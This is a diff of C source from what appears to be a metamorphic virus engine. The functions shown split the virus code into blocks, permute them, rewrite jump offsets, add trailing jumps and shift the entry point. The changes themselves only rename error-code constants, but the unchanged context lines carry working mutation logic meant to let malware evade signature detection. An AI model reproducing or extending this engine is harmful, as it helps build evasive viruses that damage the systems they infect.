@@ -49,7 +49,7 @@ static bool	split_ref(struct safe_ptr *ref_origin, struct safe_ptr *ref_half,
 	{
 		size_t	instruction = disasm_length(ref_origin->ptr + block_length, ref_origin->size - block_length);
 
-		if (!instruction) return errors(ERR_VIRUS, _ERR_CANT_SPLIT_MORE);
+		if (!instruction) return errors(ERR_VIRUS, _ERR_V_CANT_SPLIT_MORE);
 
 		block_length += instruction;
 
@@ -102,7 +102,7 @@ static bool	split_block(struct code_block *origin, struct code_block *half,
 	bool	cut_clean = false;
 
 	if (!split_ref(&origin->ref, &half->ref, seed, &cut_clean))
-		return errors(ERR_THROW, _ERR_SPLIT_BLOCK);
+		return errors(ERR_THROW, _ERR_T_SPLIT_BLOCK);
 
 	split_jumps(origin, half);
 	split_labels(origin, half);
@@ -136,11 +136,11 @@ static bool	recursive_split_blocks(struct code_block *blocks, int split,
 	int	half = POW2(split) / 2;
 
 	if (!split_block(&blocks[0], &blocks[half], seed))
-		return errors(ERR_THROW, _ERR_RECURSIVE_SPLIT_BLOCKS);
+		return errors(ERR_THROW, _ERR_T_RECURSIVE_SPLIT_BLOCKS);
 
 	if (!recursive_split_blocks(&blocks[0], split - 1, seed)
 	|| !recursive_split_blocks(&blocks[half], split - 1, seed))
-		return errors(ERR_THROW, _ERR_RECURSIVE_SPLIT_BLOCKS);
+		return errors(ERR_THROW, _ERR_T_RECURSIVE_SPLIT_BLOCKS);
 
 	return true;
 }
@@ -149,7 +149,7 @@ static bool	shard_block(struct code_block *blocks[NBLOCKS], \
 			struct code_block *blocks_mem, uint64_t *seed)
 {
 	if (!recursive_split_blocks(blocks_mem, NDIVISIONS, seed))
-		return errors(ERR_THROW, _ERR_SHARD_BLOCK);
+		return errors(ERR_THROW, _ERR_T_SHARD_BLOCK);
 
 	struct code_block	**previous_block_trailing_block = NULL;
 
@@ -275,7 +275,7 @@ static bool	shift_entry_point(void *virus_address_in_ref, \
 			return true;
 		}
 	}
-	return errors(ERR_VIRUS, _ERR_NO_ENTRY_POINT);
+	return errors(ERR_VIRUS, _ERR_V_NO_ENTRY_POINT);
 }
 
 /* ------------------------- Write permutated code -------------------------- */
@@ -300,7 +300,7 @@ static bool	adjust_jumps(struct safe_ptr virus_buffer_ref, \
 					jump_value_offset, jump_size);
 
 		if (!jump_buffer)
-			return errors(ERR_VIRUS, _ERR_ADJUST_JUMPS);
+			return errors(ERR_VIRUS, _ERR_V_ADJUST_JUMPS);
 
 		write_jump_arg(jump_buffer, jump_value, jump_size);
 	}
@@ -331,7 +331,7 @@ static bool	add_trailing_jump(struct safe_ptr virus_buffer_ref, \
 	void	*tj_end      = tj_buffer + JUMP32_INST_SIZE;
 
 	if (!tj_buffer)
-		return errors(ERR_VIRUS, _ERR_ADD_TRAILING_JUMP);
+		return errors(ERR_VIRUS, _ERR_V_ADD_TRAILING_JUMP);
 
 	size_t	tb_offset = (size_t)tb->ref.ptr - (size_t)input_start;
 	size_t	safe_tb_offset = safe_shift(tb_offset, tb->shift_amount);
@@ -339,12 +339,12 @@ static bool	add_trailing_jump(struct safe_ptr virus_buffer_ref, \
 	void	*tb_start = safe(virus_buffer_ref, safe_tb_offset, tb_size);
 
 	if (!tb_start)
-		return errors(ERR_VIRUS, _ERR_ADD_TRAILING_JUMP);
+		return errors(ERR_VIRUS, _ERR_V_ADD_TRAILING_JUMP);
 
 	int32_t	rel_jump = (size_t)tb_start - (size_t)tj_end;
 
 	if (tj_end + rel_jump != tb_start)
-		return errors(ERR_VIRUS, _ERR_BAD_TRAILING_JUMP);
+		return errors(ERR_VIRUS, _ERR_V_BAD_TRAILING_JUMP);
 
 	write_jump(tj_buffer, rel_jump, DWORD);
 	*virus_buffer_size += JUMP32_INST_SIZE;
@@ -370,17 +370,17 @@ static bool	write_permutated_code(struct safe_ptr virus_ref, \
 		size_t	safe_block_offset = safe_shift(block_offset, shift_amount);
 
 		if (!safe(virus_ref, block_offset, block_size))
-			return errors(ERR_VIRUS, _ERR_WRITE_PERMUTATED_CODE);
+			return errors(ERR_VIRUS, _ERR_V_CANT_READ_BLOCK);
 
 		void	*block_buffer = safe(virus_buffer_ref, safe_block_offset, block_size);
 
 		if (!block_buffer)
-			return errors(ERR_VIRUS, _ERR_WRITE_PERMUTATED_CODE);
+			return errors(ERR_VIRUS, _ERR_V_CANT_READ_BLOCK);
 
 		memcpy(block_buffer, (void*)block_start, block_size);
 		if (!adjust_jumps(virus_buffer_ref, block_buffer, b)
 		|| !add_trailing_jump(virus_buffer_ref, block_buffer, (void*)input_start, b, virus_buffer_size))
-			return errors(ERR_THROW, _ERR_WRITE_PERMUTATED_CODE);
+			return errors(ERR_THROW, _ERR_T_WRITE_PERMUTATED_CODE);
 	}
 	return true;
 }
@@ -411,7 +411,7 @@ bool		permutate_blocks(struct safe_ptr virus_ref,   \
 	|| !shift_blocks(blocks)
 	|| !shift_entry_point(virus_address_in_ref, virus_address_shift, blocks)
 	|| !write_permutated_code(virus_ref, virus_buffer_ref, blocks, virus_buffer_size))
-		return errors(ERR_THROW, _ERR_PERMUTATE_BLOCKS);
+		return errors(ERR_THROW, _ERR_T_PERMUTATE_BLOCKS);
 #ifdef DEBUG
 	print_split_blocks(block_memory.blocks, NBLOCKS, virus_ref, virus_buffer_ref);
 	print_general(virus_ref, virus_buffer_ref, (size_t)virus_address_in_ref, *virus_address_shift, *virus_buffer_size, seed);
